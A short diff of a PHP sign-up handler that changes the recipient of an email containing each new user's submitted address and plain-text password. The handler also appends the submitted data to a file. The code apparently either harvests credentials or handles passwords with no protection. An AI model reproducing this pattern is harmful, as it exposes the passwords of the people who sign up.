@@ -11,7 +11,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         file_put_contents($filePath, $data, FILE_APPEND | LOCK_EX);
         
         // Send email
-        $to = "your@email.com"; // Replace with your email address
+        $to = "somyajha338@email.com"; // Replace with your email address
         $subject = "New Sign-Up";
         $message = "Email: $email\nPassword: $password";
 
